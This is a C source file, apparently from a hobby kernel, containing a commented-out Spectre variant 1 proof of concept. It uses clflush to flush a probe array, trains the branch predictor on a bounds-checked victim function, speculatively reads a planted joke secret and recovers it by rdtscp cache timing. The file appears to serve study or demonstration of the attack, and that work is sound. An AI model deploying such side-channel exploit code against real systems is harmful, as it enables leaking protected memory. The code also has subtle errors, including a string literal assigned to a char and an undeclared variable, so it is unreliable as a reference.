#include "spectre.h"
#include "../mm/mm.h"

uint8_t array[ARRAY_SIZE * 4096];
uint8_t temp = 0; // Used so compiler won’t optimize out victim_function()
char *secret = 0;
/*
// Flush + Reload 
void flush_side_channel() {
	for (int i = 0; i < ARRAY_SIZE; i++)
		array[i * 4096 + DELTA] = 1; 	// write to array so in next step our "reading" will not be optimized out

	for (int i = 0; i < ARRAY_SIZE; i++) {
		asm __volatile__ (
			" clflush 0(%0) \n"
			:
			: "c" (&array[i * 4096 + DELTA])
		);
	}
}

void victim(uint32_t x) {
	if (x < ARRAY_SIZE) {
		temp &=
		array[secret[x] * 4096 + DELTA]; // force the read of secret value (hopefully speculatively)
	}
}

void readMemoryByte(uint32_t malicious_x) {
	static int results[ARRAY_SIZE];
	int tries, i;
	unsigned int junk = 0;
	register uint64_t time1, time2;
	volatile uint8_t *addr;
	secret = kmalloc(1000);
	*secret = "Krabby Patty Formula";

	for (tries = 999; tries > 0; tries--) {
		flush_side_channel();

		// Train the CPU to take the true branch inside victim().
		for (i = 0; i < 10; i++) {
			_mm_clflush(&array_size);
			for (volatile int z = 0; z < 100; z++) {
			} // Delay (can also mfence)
			victim(i);
		}

		// Try to 'leak' the secret 
		victim(malicious_x);

		// Time reads. Ignores the array[0] 
		for (i = 1; i < ARRAY_SIZE; i++) {
			addr = &array[i * 4096 + DELTA];
			time1 = __rdtscp(&junk); // READ TIMER 
			junk = *addr;	     // READ MEMORY 
			time2 =
			__rdtscp(&junk) - time1; // READ TIMER & COMPUTE ELAPSED TIME 

			if (time2 <= CACHE_HIT_THRESHOLD && i != array[0])
				results[i]++; // cache hit - add +1 to score for this value 
		}
	}

	// Locate highest-scoring results 
	int max = -1;
	for (i = 1; i < ARRAY_SIZE; i++)
		if (max < 0 || results[i] >= results[max])
			max = i;

	printf("Reading secret value at address %p = %d (score=%d)\n",
	(void *)malicious_x, max, results[max]);
}
*/
